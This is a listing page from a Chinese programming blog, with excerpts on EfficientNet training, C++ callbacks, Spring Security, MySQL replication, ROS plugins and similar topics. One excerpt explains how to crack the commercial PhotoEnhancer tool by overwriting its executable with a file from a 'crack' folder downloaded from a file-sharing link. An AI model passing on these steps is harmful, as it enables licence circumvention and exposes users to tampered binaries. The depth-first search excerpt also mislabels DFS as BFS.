使用EfficientNet进行CIFAR-10数据集进行测试，这里使用的是将CIFAR-10数据集的分辨率扩大到32X32，因为算力相关的问题所以我选择了较低的训练图像分辨率。但是假如你自己的算力比较充足的话，我建议使用训练的使用图像的分辨率设置为224X224（这个可以在代码里面的transforms.RandomResizedCrop(32)和transforms.Resize((32, 32)),进行修改，很简单），因为在测试训练的时候，发现将CIFAR10数据集的分辨率拉大可以让模型更快地进行收敛，并且识别的效果也是比低分辨率的更加好。
如果对你有用的话，希望能够点赞支持一下，这样我就能有更多的动力更新更多的学习笔记了。😄😄 代码结构的目录：
代码实现如下：
train.py
# -*- coding:utf-8 -*- # @Time : 2023-01-16 15:39 # @Author : DaFuChen # @File : CSDN写作代码笔记 # @software: PyCharm import torchvision import os import function import torch import torch.nn as nn import torch.optim as optim from torchvision import transforms from tqdm import tqdm import parameters from model import efficientnet_b0 def main(): device = torch.device("cuda:0" if torch.cuda.is_available() else "cpu") print("using {} device.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8986dd0b9da5e3b1aea923fa70719323/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d84c61e9f6b14ea6c1318198425fc283/" rel="bookmark">
			c&#43;&#43; 类的成员函数用回调函数输入
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、类结构代码实现 A.h头文件
#include "B.h" class A { private: A(){}; ~A(){}; fun(int q); public: CallBackfun(); //使用可以回调函数对象 B b; } A.cpp文件
#include "A.h" fun(int q) { //等待执行回调触发任务 } //外部调用函数。 CallBackfun() { //调用b对回调函数成员callBack(int q) b.callBack([this](int q ){fun(q);} ); //正确 b.callBack( fun); //报错invalid use of non-static member function ，只适用于back是非类成员函数 b.callBack(&amp;fun); //报错error: ISO C++ forbids taking the address of an unqualified //or parenthesized non-static member function to form a pointer to member function. b.callBack(&amp;A::fun); //报错error: no matching function for call to ‘B::callBack( void (A::*)( int))’ } 2、总结 如果back(int q)只是普通函数，可以直接调用，而在成员函数，需要考虑回调函数，是有创建线程的过程，原因是 C ++禁止使用不合格或带括号的非静态成员函数的地址形成指向成员函数的指针，所使用[this (datatype intput ){func(input);}],进行传递函数指针，来创建线程。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1a7d61929e2038f667393626c46026c0/" rel="bookmark">
			R语言实现读取excel
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		可以使用R语言中的"readxl"包来读取excel文件。可以使用read_excel()函数读取整个工作簿或指定工作表。示例代码如下:
# 安装包 install.packages("readxl") # 载入包 library(readxl) # 读取整个工作簿 data &lt;- read_excel("data.xlsx") # 读取特定工作表 data &lt;- read_excel("data.xlsx", sheet = "Sheet1") 如果需要读取其他格式，可以使用read_csv()读取csv文件,read_json()读取json文件等。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fc5000ec1560e4227a4bd037cd52097b/" rel="bookmark">
			算法之深度优先搜索
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 算法之深度优先搜索 定义(たぶん？):过程：代码（Python下）： 定义(たぶん？): 1.深度优先搜索算法（Depth First Search）（BFS）。
2.使用栈(Stack)来实现。
过程： 1、 整个过程可以看做一个倒立的树形：
· 把根节点压入栈中。
· 每次从栈中弹出一个元素，搜索所有在它下一级的元素，把这些元素压入栈中。并把这个元素记为它下一级元素的前驱。
· 找到所要找的元素时结束程序。
· 如果遍历整个树还没有找到，结束程序。
2、 使用图片来进一步帮助理解过程：
假设以A为根节点，将根节点A放入栈中。再将A从栈中取出，找寻A的子节点B和C放入栈中。（此时处于节点A）
从栈中取出节点B，寻找B的子节点D，放入栈中。（ 此时处于节点B）
取出节点D，寻找子节点F并放入栈中。
下一步取出节点F重复执行以上操作，直至遍历全图。
代码（Python下）： graph = { 'A':['B','C'], 'B':['A','C','D'], 'C':['A','B','D','E'], 'D':['B','C','E','F'], 'E':['C','D'], 'F':['D'] } def DFS(graph,start): stack = list(start) #将起始节点放入栈 closed = set() #创建一个集合，存放已经走过的节点 closed.add(start) while(len(stack)&gt;0): vertex = stack.pop() #从栈取出一个节点 nodes = graph[vertex] #判断节点是否走过 for node in nodes: if node not in closed: #若节点没有走过，则放入栈与集合 stack.append(node) closed.add(node) print(vertex,end='\t') DFS(graph,'A') ''' 若以A为根节点，那么遍历的结果可以是： A C E D F B ''' 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d2f5370106d13b62d11c4f80754f3ee6/" rel="bookmark">
			Java为什么成员变量赋值给局部变量 avoid getfield opcode
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		It's a coding style made popular by Doug Lea. It's an extreme optimization that probably isn't necessary; you can expect the JIT to make the same optimizations. (you can try to check the machine code yourself!) Nevertheless, copying to locals produces the smallest bytecode, and for low-level code it's nice to write code that's a little closer to the machine. ...copying to locals produces the smallest bytecode, and for low-level code it's nice to write code that's a little closer to the machine 这个是Doug Lea流行起来的.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d2f5370106d13b62d11c4f80754f3ee6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/edc4105b8d1600a6ae9aa12572c51301/" rel="bookmark">
			使用EfficientNet进行CIFAR10训练
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		论文下载地址：https://arxiv.org/pdf/1905.11946.pdf
具体模型细节知识点：EfficientNet模型的完整细节_喜欢打酱油的老鸟的博客-CSDN博客
使用EfficientNet进行CIFAR-10数据集进行测试，这里使用的是将CIFAR-10数据集的分辨率扩大到32X32，因为算力相关的问题所以我选择了较低的训练图像分辨率。但是假如你自己的算力比较充足的话，我建议使用训练的使用图像的分辨率设置为224X224（这个可以在代码里面的transforms.RandomResizedCrop(32)和transforms.Resize((32, 32)),进行修改，很简单），因为在测试训练的时候，发现将CIFAR10数据集的分辨率拉大可以让模型更快地进行收敛，并且识别的效果也是比低分辨率的更加好。
如果对你有用的话，希望能够点赞支持一下，这样我就能有更多的动力更新更多的学习笔记了。😄😄 代码结构的目录：
代码实现如下：
train.py
# -*- coding:utf-8 -*- # @Time : 2023-01-16 15:39 # @Author : DaFuChen # @File : CSDN写作代码笔记 # @software: PyCharm import torchvision import os import function import torch import torch.nn as nn import torch.optim as optim from torchvision import transforms from tqdm import tqdm import parameters from model import efficientnet_b0 def main(): device = torch.device("cuda:0" if torch.cuda.is_available() else "cpu") print("using {} device.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/edc4105b8d1600a6ae9aa12572c51301/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5f053cf4352c7399a3fdfe05f584dffd/" rel="bookmark">
			Spring Security 6.0(spring boot 3.0) 下认证配置流程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 前提将要实现的功能依赖(POM)示例代码基础组件验证码MyUserDetailsServiceImpl(认证/权限信息)MyAuthenticationHandler(Handler)MyRememberMeServices(记住我) 核心组件MyLoginFilter(登陆过滤器)MySecurityConfig(核心配置) 前提 强烈建议在学习完 2.x 版本的配置流程之后再阅读本文
推荐一个：视频教程
将要实现的功能 使用用户名+密码+验证码+记住我功能进行登陆CSRF校验将Session交给Redis管理，将记住我功能持久化到数据库 依赖(POM) 数据库操作部分省略了
&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;3.0.0&lt;/version&gt; &lt;relativePath/&gt; &lt;/parent&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--redis--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--session-redis--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.session&lt;/groupId&gt; &lt;artifactId&gt;spring-session-data-redis&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--验证码--&gt; &lt;dependency&gt; &lt;groupId&gt;com.github.penggle&lt;/groupId&gt; &lt;artifactId&gt;kaptcha&lt;/artifactId&gt; &lt;version&gt;2.3.2&lt;/version&gt; &lt;/dependency&gt;	&lt;!--springdoc --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springdoc&lt;/groupId&gt; &lt;artifactId&gt;springdoc-openapi-starter-webmvc-ui&lt;/artifactId&gt; &lt;version&gt;2.0.0&lt;/version&gt; &lt;/dependency&gt; &lt;!--knife4j - 接口文档UI--&gt; &lt;dependency&gt; &lt;groupId&gt;com.github.xiaoymin&lt;/groupId&gt; &lt;artifactId&gt;knife4j-springdoc-ui&lt;/artifactId&gt; &lt;!--在引用时请在maven中央仓库搜索3.X最新版本号--&gt; &lt;version&gt;3.0.3&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 注：结尾包含了 springdoc+knife4j 生成接口文档，示例代码中也包含了springdoc提供的注解。
示例代码 基础组件 验证码 生成配置(与视频教程中一致)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5f053cf4352c7399a3fdfe05f584dffd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c04c4bcb6eca88733d41106b42e34f17/" rel="bookmark">
			Linux下配置Mysql主从复制（一主一从）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		注：CentOS7 Mysql5.7 1. 主从服务器概况 主：IP:192.168.31.7 PORT:3306
从：IP:192.168.31.99 PORT:3306
2. 修改主服务器master # vi /etc/my.cnf [mysqld] server-id = 1 # 节点ID,确保唯一 # log config log-bin = mysql-bin # 开启mysql的binlog日志功能 sync_binlog = 1 # 控制数据数据库的binlog刷到磁盘上去 , 0 不控制，性能最好，1每次事物提交都会刷到日志文件中，性能最差，最安全 binlog_format = mixed #binlog日志格式，mysql默认采用statement，建议使用mixed expire_logs_days = 7 #binlog过期清理时间 max_binlog_size = 100m #binlog每个日志文件大小 binlog_cache_size = 4m #binlog缓存大小 max_binlog_cache_size= 512m #最大binlog缓存大 binlog-ignore-db=mysql #不生成日志文件的数据库，多个忽略数据库可以用逗号拼接，或者 复制这句话，写多行 auto-increment-offset = 1 # 自增值的偏移量 auto-increment-increment = 1 # 自增值的自增量 slave-skip-errors = all #跳过从库错误 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c04c4bcb6eca88733d41106b42e34f17/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f6ec91900b2db064d4b0565ee3b76e48/" rel="bookmark">
			win32 ini 读取所有section 下边的key value
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		const int bufferSize = 10240; char buffer[bufferSize] = ""; int charsRead = 0; charsRead = GetPrivateProfileSectionA("record", buffer, bufferSize, "d:\\test.ini"); if ((0 &lt; charsRead) &amp;&amp; ((bufferSize - 2) &gt; charsRead)) { // walk the buffer extracting values // start at the beginning (const to remind us not to // change the contents of the buffer) const char* pSubstr = buffer; // while we have non-empty substrings... while ('\0' != *pSubstr) { // length of key-value pair substring size_t substrLen = strlen(pSubstr); // split substring on '=' char const char* pos = strchr(pSubstr, '='); if (NULL !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f6ec91900b2db064d4b0565ee3b76e48/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/84bc7bf7f59d4c67ab0009a3001422f1/" rel="bookmark">
			【ROS】使用pluginlib自定义costmap地图层
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 文章目录
前言
一、重写地图层
1.包含头文件 2.onInitialize()
3.updateBounds()
4.updateCosts()
二、向ROS注册
1.插件描述文件
2.向ROS注册插件
3.在costmap配置文件中使用
总结
前言 pluginlib是一个 C++ 库，用于从 ROS 包中加载和卸载插件。插件是从运行时库（即共享对象、动态链接库）加载的动态可加载类。使用 pluginlib，人们不必将他们的应用程序显式链接到包含类的库，相反，pluginlib 可以在任何时候打开一个包含导出类的库，而无需应用程序事先知道该库或包含类定义的头文件. 插件可用于在不需要应用程序源代码的情况下扩展/修改应用程序行为。
在costmap中就为用户提供了便捷丰富的地图层接口，用户可以使用C++中的继承操作，继承costmap_2d中的类，然后重写其中的虚函数，以实现自己的地图层功能，本文以添加禁用区域为例说明如何实现一个自定义的costmap地图层。
一、重写地图层 1.包含头文件 为了允许动态加载类，必须将其标记为导出类。这是通过特殊宏PLUGINLIB_EXPORT_CLASS完成的。一般PLUGINLIB_EXPORT_CLASS都写在文件的开头，以虚拟墙地图层为例：
#include &lt;costmap_prohibition_layer/costmap_prohibition_layer.h&gt; #include &lt;pluginlib/class_list_macros.h&gt; PLUGINLIB_EXPORT_CLASS(costmap_prohibition_layer_namespace::CostmapProhibitionLayer, costmap_2d::Layer) 如果想实现基本的地图层插件至少要重写这几个函数：
void onInitialize()：在costmap执行初始化initialize后会执行这个函数，相当于为用户提供的初始化接口。void updateBounds(double robot_x, double robot_y, double robot_yaw, double *min_x, double *min_y, double *max_x, double *max_y)：计算插件图层要更新到主图层区域的大小，每个图层都可以增加这个尺寸，如下图（b）所示void updateCosts(costmap_2d::Costmap2D&amp; master_grid, int min_i, int min_j, int max_i, int max_j)：将每个图层的代价值更新到主图层，如下图（c）（d）（e）所示 2.onInitialize() onInitialize()函数主要执行一些初始化工作，如下面代码所示，下面进行逐行讲解。
void CostmapProhibitionLayer::onInitialize() { ros::NodeHandle nh("~/" + name_); current_ = true; _dsrv = new dynamic_reconfigure::Server&lt;CostmapProhibitionLayerConfig&gt;(nh); dynamic_reconfigure::Server&lt;CostmapProhibitionLayerConfig&gt;::CallbackType cb = boost::bind(&amp;CostmapProhibitionLayer::reconfigureCB, this, _1, _2); _dsrv-&gt;setCallback(cb); // get a pointer to the layered costmap and save resolution costmap_2d::Costmap2D *costmap = layered_costmap_-&gt;getCostmap(); _costmap_resolution = costmap-&gt;getResolution(); // set initial bounds _min_x = _min_y = _max_x = _max_y = 0; // reading the prohibition areas out of the namespace of this plugin!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/84bc7bf7f59d4c67ab0009a3001422f1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eee0f280d83fa39e322e3bb6425b42ce/" rel="bookmark">
			在Linux上手工配置ip地址
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、进入网卡配置文件的目录
[root@halou-gh ~]cd /etc/sysconfig/network-scripts/ #进入目录的路径 [root@halou-gh network-scripts] ls #查看文件夹里的内容 2、修改配置文件
[root@halou-gh network-scripts] vim ifcfg-ens33 eg : 比方说我的配置文件打开之后的样子是酱紫
3、进去之后删掉一些没有的信息，比方说IPV4，IPV6这些内容，之后进行静态配置
首先我们得明白那些英文是干什么的：
BOOTPROTO="none" none或者static, dhcp表示动态获得ip地址，通过dhcp服务器的分配。
NAME="ens33" 网络连接的名字
UUID="9f785503-7beb-434b-825a-fdc8de7df49e" 是网络连接的唯一标识,一个硬件会对应一个编号，这个编号自动生成
DEVICE="ens33" 设备名字
ONBOOT="yes" yes表示开机的时候激活网络连接 no 禁用这个网络连接
接下来就要往里边添加静态配置了：(PREFIX和NETMASK只要有一个就行了)
IPADDR=192.168.0.203 #ip地址 PREFIX=24 #子网掩码的长度24 相当于 255.255.255.0 #NETMASK=255.255.255.0 #子网掩码为：255.255.255.0 GATEWAY=192.168.0.1 #默认网关 DNS1=114.114.114.114 #首选dns服务器 DNS2=192.168.0.1 #备用dns服务器 eg: 改为之后就是这个样子：
4、重新启动服务，让新的配置生效
在8里边用命令：ipup ens33 就激活了
在7里边用：service network restart 刷新服务
5、最后ping一个百度验证网络是否通畅
ping www.baidu.com
注意
如何知道这个ip地址在局域网里是否有人使用？
需要提前去ping一个这个ip地址，看是否ping通 如果通了 说明有人使用，如果不通就没有人可以使用 那就可以用了
怎么改ip地址呢
直接在vm里的配置文件中改 别去xshell上
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/eee0f280d83fa39e322e3bb6425b42ce/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9e342d6271466eeffa9210d59ef4fb82/" rel="bookmark">
			centos7 scl工具集升级gcc和g&#43;&#43;（简易版）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、安装scl源
sudo yum install -y centos-release-scl scl-utils-build 2、升级gcc、g++
sudo yum install -y devtoolset-7-gcc devtoolset-7-gcc-c++ 3、启动更新后的版本
scl enable devtoolset-7 bash 注意：启动更新后的版本只能在当前会话有效，重新登陆会失效
解决：想要永久有效，需要将启动命令写入~/.bash_profile文件中，不建议写入/etc/bashrc文件中，因为这是全局添加，会影响所有使用该云服务器的用户。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d229e88a75a4180e61a59a7626bb9f44/" rel="bookmark">
			09、秒懂 Java CompletableFuture ( 下 )
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		上一章节中我们讲解了 CompletableFuture 的一些基本用法，比如如何使用和如何处理异步计算结果。本章节我们继续，主要讲解如何使用 CompletableFuture 来组合异步计算的结果
组合 Futures CompletableFuture API 最吸引人的部分，应该是能够在一系列链式计算步骤中组合 CompletableFuture 实例。这种链式的结果本身就是CompletableFuture，允许进一步链接和组合。
这种方法在函数式语言中无处不在，通常被称为 「一元 ( monadic ) 设计模式 」。
CompletableFuture 提供了方法 thenCompose() 用于按顺序链接两个 Futures。该方法的参数是一个能够返回 CompletableFuture 实例的函数或表达式。而该函数或表达式的参数则是先前计算步骤的结果，这允许我们在下一个 CompletableFuture 的 lambda 中使用这个值。
例如下面这个示例
CompletableFuture&lt;String&gt; completableFuture = CompletableFuture.supplyAsync(() -&gt; DDKK.COM 弟弟快看) .thenCompose(s -&gt; CompletableFuture.supplyAsync(() -&gt; s + 程序员编程资料站)); assertEquals("DDKK.COM 弟弟快看，程序员编程资料站", completableFuture.get()); thenCompose() 方法与 thenApply() 一起实现了一元设计模式的基本构建块，它们与Java 8 中提供的 Stream 和 Optional 类的 map 和flatMap 方法密切相关。
两个方法都接收一个函数并将其应用于计算结果，但 thenCompose() （ flatMap() ）方法接收一个函数，该函数返回相同类型的另一个对象，这样，就允许将这些类的实例组合为构建块。
如果要执行两个独立的 Futures 并对其结果执行某些操作，可以使用 Future 的 thenCombine() 并传递能够接收两个参数的函数或表达式来处理这两个结果。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d229e88a75a4180e61a59a7626bb9f44/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1fbf29ce0bd8a9f23e9b80f6a4e9a877/" rel="bookmark">
			用火狐浏览器看b站视频默认没有声音
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 目录 问题场景：
问题描述：
原因分析：
解决方案：
1.按键盘上的 “Ctrl + i” 打开页面信息控制面板
2.点击 “权限”
3.找到最下面的 “自动播放” ，取消掉 “使用默认设置”
4.勾选 “允许音频和视频”
问题场景： 用火狐浏览器观看b站视频
问题描述： 每次点击进入一个视频时，都没有声音，必须重新点击解除静音才能正常观看。
很费劲，而且其他浏览器都没有这个问题。
原因分析： 火狐浏览器默认设置了视频播放静音，修改设置即可。
解决方案： 1.按键盘上的 “Ctrl + i” 打开页面信息控制面板 2.点击 “权限” 3.找到最下面的 “自动播放” ，取消掉 “使用默认设置” 4.勾选 “允许音频和视频” 现在退出到b站首页，再点击一个视频就可正常观看啦~ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e46081834c330d2ca866e4b9293c40c0/" rel="bookmark">
			谷粒商城-启动renren-fast-vue
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		关于启动renren-fast-vue
为了启动这个，这两天都快搞疯了，本人没搞过前端，所以很费劲
资料：包含node.js10.16.3与python2.7.2
链接：https://pan.baidu.com/s/1CLSNkiQhMgtMhvQ_bT1fxw 提取码：1234 --来自百度网盘超级会员V4的分享
步骤： 1.启动该项目，先搞个vscode 2.随后下载node.js 本人试了好几个，建议使用10.16.3的版本，（我用这个跑通了，前面下的最新版18.0的死活跑不通） 这个是官方下载地址：
https://nodejs.org/download/release/v10.16.3/https://nodejs.org/download/release/v10.16.3/
（注，项目不要放到有中文的目录下）
3.要是直接使用尚硅谷老师提供的代码，建议修改package.json 文件的 "node-sass": "^8.0.0", 修改为
"node-sass": "5.0.0", （可能是我比较菜，应该还有别的办法）
4.安装python2.0版本 可以从上面的链接中直接那python，进行安装，配置环境
5.配置镜像地址 npm --registry https://registry.npm.taobao.org install express 6.加载模块 npm install 能来着的基本都是有问题的， 所以建议先移除模块 步骤
1) 卸载模块（要是这个都出错，那就直接把 项目里的 node_modules文件夹上删除了）
npm uninstall 2）清除缓存
npm cache clean --force 3） 再装一遍
npm install 7.启动 npm run dev 8.停止 连按两下 ctrl+c 就行了
没验证🐎，是因为没有起后端项目
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/803a85d66808f5ca222345e6ea813f5e/" rel="bookmark">
			不同版本Windows操作系统的TCP参数值
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Windows server 2012 R2 Microsoft Windows [版本 6.3.9600] (c) 2013 Microsoft Corporation。保留所有权利。 C:\Users\Administrator&gt;netsh i t sh g 查询活动状态... TCP 全局参数 ---------------------------------------------- 接收端缩放状态 : enabled 烟囱卸载状态 : disabled NetDMA 状态 : disabled 直接缓存访问(DCA) : disabled 接收窗口自动调节级别 : normal 附加拥塞控制提供程序 : none ECN 功能 : disabled RFC 1323 时间戳 : disabled 初始 RTO : 3000 接收段合并状态 : enabled 非 Sack Rtt 复原 : disabled 最大 SYN 重新传输次数 : 2 C:\Users\Administrator&gt; Windows 10 Microsoft Windows [版本 10.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/803a85d66808f5ca222345e6ea813f5e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/859a5ec79ee3aaa23b364bf632be70b9/" rel="bookmark">
			PhotoEnhancer老照片修复，旧照修复，图像去噪，黑白照上色，AI图像修复，AI图像去噪，一键自动修复照片，附下载链接
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一款老照片修复神器，基于人工智能算法的图片修补工具，可一键轻松修复低像素和模糊照片。
文末附工具下载链接~
一、软件简介 软件自带四种人工智能模型：
【通用模型】：适合风景、建筑、动物、花卉等真实场景。
【降噪模型】：适用于普通照片去除噪点，以及动漫卡通图片变清晰。
【人脸专用模型】：专门针对人脸恢复和老照片修补。
【黑白上色】：针对黑白照片进行上色。
工具自带的案例图像修复效果：
为了检测工具实际效果如何，我在网上随便找了一个看起来比较模糊的照片，使用工具的【人脸专用模型】进行修复，效果如下：
左侧是未修复的照片，右侧是修复后的照片，看起来右侧确实比左侧要清晰，看来利用工具修复的效果还是不错的。
二、软件使用方法 1、软件安装 解压下载的压缩文件，可以看到一个文件夹和一个可执行文件
首先双击可执行文件进行软件安装，也就是执行【hitpawphotoenhancer_hitpaw.exe】
安装时要记住自己选择的安装路径，也就是到下面这一步时，需要记住自己将软件安装在哪个文件夹了，因为第二步要用到。
接下来一路点击【下一步】直到完成安装。
2、软件激活 安装完成后先不要打开软件，因为此时还是未激活状态，此时被修复的照片无法导出。我们进入crack文件夹内，找到【HitPawPhotoEnhancer.exe】
将这个可执行文件拷贝到我们安装软件的目录中，替换掉原文件，即可完成软件激活。
以下是动图演示
完成上述操作后，再打开软件，就可以正常使用软件进行照片修复并导出图片了。
三、下载链接 https://pan.baidu.com/s/1Y7vpvzAHTiMpsw0X3pgFLQ?pwd=cf4m
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d8ba6b4c449840240ba7232d9318fab6/" rel="bookmark">
			读 | Software Architecture Patterns
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		个人博客
Software Architecture Patterns》是 Mark Richards 2015 年出的一本小册子，对常用的架构模式进行了一个简单梳理，书中列了 5 种：
分层（Layered）事件驱动（Event-Driven）微内核（Microkernel）微服务（Microservices）基于空间（Space-Based） Mark Richards 后续又出了两本书，《Fundamentals of Software Architecture》、《Software Architecture: The Hard Parts》——参见 读后感。
Layered Architecture 单体架构，将应用这个整体分解为不同的层次，在不同的层次处理不同的问题，即关注点分离原则的一种实际运用。在社会生活的各方面同样可以观察到对该原则的广泛运用，比如组织中的科层制——总经理就不会去厂房打螺丝。软件设计的这种原则往前追溯，可能就借鉴自人们在社会生活中长期实践所总结出的经验。
分层架构在网络中得到了最成功的运用——OSI 分层模型（OSI 模型发展过程中遇到的问题及其解决方案，对其他运用分层思维解决问题的领域具有良好的借鉴意义），在 Web 应用中也广为人知，常用的 MVC 架构即是把应用分解为 模型-视图-控制器 三层，模型层对接业务模型，视图层对接用户界面展示，控制器层居中粘合模型和视图。
典型的 Web 分层架构包括 4 层：
表现层，负责界面展现，面向 PPT 的说法叫负责人机交互接口；业务层，负责实现业务逻辑；持久层，负责把数据持久化，掉电不丢失；数据库层，应用使用的数据库。
请求必须沿着一定的方向逐层传递，不能跨层——每一层都是 closed 的，这样做的好处是隔离了变化，某一层的变化只影响相邻层，而不会影响其他层。特殊情况下，某层也可以设置为 open —— 即允许被跨越。
总评价：
全局敏捷性，低，单体本质上不能快速响应变化，同时各组件可能紧耦合在一起；易部署性，低，设计不良的情况下一个小的改动需要重新部署整个应用；易测试性，高，因为严格分层，所以可以方便地进行 mock/stub；性能，低，请求必须经过所有层，而可能在某些层没有处理逻辑；易伸缩性，低，扩展时需要进行整层扩展或整个应用整体扩展；易开发性，高，该架构广为人知且团队组织架构通常也分为了前端/后端/DBA，可以很好地映射并组织工作。 Event-Driven Architecture 大多数的应用是请求响应式的，而事件模型是获取相应事件并采取相应的行动。事件驱动架构是一种分布式异步架构，具有高可扩展性。
事件驱动架构有两种拓扑：中介拓扑、代理拓扑。
中介拓扑（mediator topology）
由中介来规划事件应该发送到哪些事件处理器，从而控制整个事件处理过程，如 BPM 业务流程流转。
架构组件包括：
初始事件，启动整个事件过程的事件；事件队列，存放初始事件的队列；事件中介，核心组件，负责编排整个处理过程，根据掌握的事件处理步骤生成事件，并发送到对应的事件通道，可以根据领域不同划分出多个；事件通道，存放（需要事件处理器处理的）事件，通常也是队列；事件处理器，监听事件通道，处理事件，并向中介返回已完成事件处理的响应，不会告知对系统其他部分做了什么。
简单的事件中介有 Spring Integration、Apache Camel、Mule ESB，复杂的有 Apache ODE、Oracle BPEL。一种具体的使用方式是将事件分为简单/复杂/困难，每个事件都通过一个简单事件中介，简单事件中介查询事件分类来决定是自己处理还是委托给更复杂的事件中介。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d8ba6b4c449840240ba7232d9318fab6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/605188b5cc80f25b810a7c6e5ba4a373/" rel="bookmark">
			Edge出现无法访问此页面xxxxxx已拒绝连接。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Edge出现无法访问此页面so.csdn.net 已拒绝连接。
请尝试：
检查连接
检查代理和防火墙
ERR_CONNECTION_REFUSED
情况
解决方法
关闭即可
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7f285a3de528ce3c2c23d1d827db49dc/" rel="bookmark">
			【ROS】dynamic_reconfigure配置详细说明
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 文章目录
前言
一、编写.cfg文件
二、为节点配置dynamic_reconfigure
总结
前言 dynamic_reconfigure配置是ROS中为了方便用户对程序中的参数进行实时调整而推出的工具，配置好自己的dynamic_reconfigure文件后，可以很方便的使用ROS提供的rqt_reconfigure工具对程序的参数进行合理调整，以获得最优的性能。
例如：move_base中就针对costmap、planner等设置了很多动态调整的参数，可以方便用户在使用过程中调整得到合适的参数。
